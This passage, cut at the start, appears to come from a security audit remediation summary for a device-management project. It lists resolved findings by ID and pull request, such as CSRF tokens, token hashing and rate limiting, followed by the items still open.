3. **C3** — `crypto.getRandomValues()` / `crypto.randomUUID()` (PR #48)
4. **H1** — API tokens hashed before storage (PR #48)
5. **H2** — `sameSite: "Lax"` (PR #48)
6. **H3** — Session invalidation on logout (PR #48)
7. **H4** — CSRF synchronizer token on approval form (PR #52)
8. **H5** — Timing attack eliminated by H1 fix (PR #48)
9. **H6** — Scoped Proxy for RPC env (PR #52)
10. **H7** — Zod `DeviceMessageSchema` at WebSocket boundary (PR #48)
11. **H9** — `ALLOWED_DEVICE_METHODS` allowlist proxy (PR #48, #52)
12. **H10** — Investigated; no recalculation needed (PR #52)
13. **H11** — Redirect URI re-validation (PR #51)
14. **M1** — Rate limiting (PR #49)
15. **M2** — Session token UNIQUE index (migration 0014)
16. **M3** — Atomic refresh token rotation via `DB.batch()`
17. **M4** — 4KB payload size limit
18. **M6** — `getCrons`/`onCron` blocked
19. **M8** — Legacy POST handler removed
20. **M9** — HTML escaping on approval page (PR #48)
21. **M10** — Error details stripped in production (PR #48)
22. **M11/M12** — Integer range checks in firmware
23. **M13** — Hardware RNG for masking key
24. **L1** — Pending commands bounded

### Remaining Open Items
- **H8** — Script validation timeout (no execution timeout on validator worker)
- **H12** — Plaintext firmware credentials (design limitation; mitigated by token rotation)
- **M5** — Same-project RPC trust model (intentional design; needs documentation)
- **M7** — `handleRemoteCall` deviceMeta from caller (low risk; scriptMeta assembled from DB)
- **L2** — Cron name log injection (partially hardened — `JSON.stringify` + truncation)
- **L3** — capnp config string interpolation (low risk; attacker already has code exec)
- **L4** — Static placeholder strings (cosmetic)
- **L5** — No device token rotation without reflashing (design limitation)
